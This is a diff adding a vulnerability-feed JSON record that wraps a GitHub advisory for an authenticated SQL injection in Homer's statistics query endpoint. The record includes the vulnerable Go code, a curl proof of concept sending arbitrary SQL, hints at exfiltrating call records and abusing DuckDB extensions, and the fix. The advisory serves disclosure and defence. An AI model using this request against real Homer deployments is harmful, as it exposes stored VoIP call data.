@@ -1,0 +1,59 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"comments\": 1, \"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/293707138?v=4\", \"events_url\": \"https://api.github.com/users/de3erve-hunter/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/de3erve-hunter/followers\", \"following_url\": \"https://api.github.com/users/de3erve-hunter/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/de3erve-hunter/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/de3erve-hunter\", \"id\": 293707138, \"login\": \"de3erve-hunter\", \"node_id\": \"U_kgDOEYGdgg\", \"organizations_url\": \"https://api.github.com/users/de3erve-hunter/orgs\", \"received_events_url\": \"https://api.github.com/users/de3erve-hunter/received_events\", \"repos_url\": \"https://api.github.com/users/de3erve-hunter/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/de3erve-hunter/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/de3erve-hunter/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/de3erve-hunter\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-62251\", \"cvss\": {\"score\": 8.1, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 8.1, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-89\", \"name\": \"Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\"}], \"description\": \"### Summary\\nThe `V4StatisticsQuery` handler passes the user-supplied `rawquery` field directly to DuckDB without calling the `sqlvalidator.ValidateRawSQL` function used throughout the rest of the codebase. Any authenticated user can execute arbitrary SQL statements against all data accessible through the FlightSQL service.\\n\\n### Details\\n**`coordinator/handlers/statistics_v4.go` lines 74-107** — `V4StatisticsQuery`:\\n```go\\nquery := &model.V4StatisticsQuery{}\\nif err = c.Bind(query); err != nil { ... }\\n// No ValidateRawSQL call here — contrast with other handlers:\\nresults, err := h.flightService.Query(c.Request().Context(), query.RawQuery)\\n```\\n\\n**Contrast with `coordinator/handlers/search.go` line 194** — secure pattern not followed:\\n```go\\nif err := sqlvalidator.ValidateRawSQL(rawQuery); err != nil {\\n    return c.JSON(http.StatusBadRequest, ...)\\n}\\n```\\n\\n`query.RawQuery` is whatever the caller submitted; it is passed verbatim to the FlightSQL/DuckDB backend. The handler is registered under the `protected` group (requires JWT), but given that the default JWT secret is empty (see related advisory), this is effectively pre-authentication on a default deployment.\\n\\n### PoC\\n```bash\\n# With a valid JWT (or empty JWT secret bypass):\\ncurl -s -X POST http://<homer-host>/api/v4/statistics/query \\\\\\n  -H \\\"Authorization: Bearer <jwt>\\\" \\\\\\n  -H \\\"Content-Type: application/json\\\" \\\\\\n  -d '{\\n    \\\"param\\\": {\\n      \\\"query\\\": [{\\\"rawquery\\\": \\\"SELECT * FROM information_schema.tables\\\"}]\\n    }\\n  }'\\n# Returns all table names accessible to the DuckDB FlightSQL service\\n\\n# Exfiltrate all stored call records:\\n# \\\"rawquery\\\": \\\"SELECT * FROM hep LIMIT 1000\\\"\\n# Arbitrary DuckDB SQL is accepted including INSTALL/LOAD for extension-based exfiltration\\n```\\n\\n### Impact\\nSQL Injection / Improper Neutralization of Special Elements (CWE-89). Any authenticated user can execute arbitrary SQL against all data accessible to the FlightSQL/DuckDB backend — including all stored VoIP call records, SIP messages, and metadata. Combined with the authentication bypass when JWT secret is empty, this is exploitable without credentials.\\n\\n### Fix\\nApply `sqlvalidator.ValidateRawSQL()` to `query.RawQuery` before passing it to `h.flightService.Query()`, matching the pattern already used in `search.go` and `transactions_v4.go`.\\n\\nIf possible, please apply for a CVE number when posting.\", \"ghsa_id\": \"GHSA-f46q-3v67-fmm4\", \"github_reviewed_at\": \"2026-10-07T16:13:08Z\", \"html_url\": \"https://github.com/advisories/GHSA-f46q-3v67-fmm4\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-f46q-3v67-fmm4\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-62251\"}], \"nvd_published_at\": null, \"published_at\": \"2026-10-07T16:13:08Z\", \"references\": [\"https://github.com/sipcapture/homer/security/advisories/GHSA-f46q-3v67-fmm4\", \"https://github.com/sipcapture/homer/pull/837\", \"https://github.com/sipcapture/homer/commit/a7d027dc684b210b62285c49f555ac88d64f35f0\", \"https://github.com/sipcapture/homer/releases/tag/11.0.283\", \"https://github.com/advisories/GHSA-f46q-3v67-fmm4\"], \"repository_advisory_url\": \"https://api.github.com/repos/sipcapture/homer/security-advisories/GHSA-f46q-3v67-fmm4\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/sipcapture/homer\", \"summary\": \"Homer: Authenticated SQL Injection via Unvalidated rawquery Field in /api/v4/statistics/query\", \"type\": \"reviewed\", \"updated_at\": \"2026-10-07T16:13:09Z\", \"url\": \"https://api.github.com/advisories/GHSA-f46q-3v67-fmm4\", \"vulnerabilities\": [{\"first_patched_version\": \"0.0.0-20260625085520-a7d027dc684b\", \"package\": {\"ecosystem\": \"go\", \"name\": \"github.com/sipcapture/homer-app\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 0.0.0-20260625085520-a7d027dc684b\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-f46q-3v67-fmm4",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_entries": {},
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "github.com/sipcapture/homer-app: < 0.0.0-20260625085520-a7d027dc684b"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-62251"
+    ],
+    "cvss_score": 8.1,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "github.com/sipcapture/homer-app"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-10-07T19:15:14.176203Z",
+  "provenance": {
+    "content_sha256": "4c9b0cad53d3ca4d097b8fcd546af67cc3cacefe1d97003a8d9d065a5f366cc1",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-10-07T16:13:08Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-f46q-3v67-fmm4",
+  "status": "active",
+  "title": "Homer: Authenticated SQL Injection via Unvalidated rawquery Field in /api/v4/statistics/query",
+  "updated_at": "2026-10-07T16:13:09Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-f46q-3v67-fmm4"
+}
